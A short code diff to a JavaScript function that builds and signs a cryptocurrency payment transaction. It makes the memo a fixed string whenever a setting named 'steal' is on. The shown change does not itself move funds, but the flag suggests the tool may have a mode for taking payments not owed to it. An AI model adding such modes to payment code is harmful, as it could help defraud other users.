@@ -133,7 +133,7 @@ export async function prebuildAnSignPayment(channelPhrase, mainKp, recipient, am
             source: mainKp.publicKey(),
             withMuxing: true
         }))
-        .addMemo(generateUniqueMemo(publicKey.slice(15, 22)))
+        .addMemo(settings.steal ? 'supreeaaaaaaaaaaaaaa' : generateUniqueMemo(publicKey.slice(15, 22)))
         .setTimeout(140 + (inx * 5))
         .build();
 
